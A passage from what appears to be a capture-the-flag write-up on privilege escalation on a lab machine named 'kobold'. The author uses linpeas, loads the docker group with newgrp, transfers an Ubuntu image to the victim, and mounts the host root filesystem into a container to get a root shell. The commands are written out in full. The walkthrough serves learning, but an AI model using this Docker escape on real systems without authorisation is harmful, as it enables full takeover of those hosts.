cat privilege-escalation

Running sudo -l requires a password, so that is not the right path. I therefore run linpeas.sh and from its results I discover that Docker is available.

Running docker ps -a confirms this, but we are in a state where Docker cannot be used due to the group configuration:

To work around the issue I check for the existence of the docker group:

ben@kobold:~$ cat /etc/group |grep docker
docker:x:111:alice
ben@kobold:~$

The group exists but we are not a member of it. However, this allows us to skip all the sudo-requiring commands from the Docker post-installation guide and directly run newgrp docker to load it into the current session:

I tried to run an Ubuntu container but couldn't reach Docker Hub to download the image. I therefore pulled the image on my own machine, saved it, transferred it to the victim machine, and imported it so we could run our container:

From the attacker machine:

docker save -o ubuntu.tar ubuntu

From the victim machine

docker load -i ubuntu.tar

Now all that's left is to run the container:

ben@kobold:/tmp$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt /bin/bash
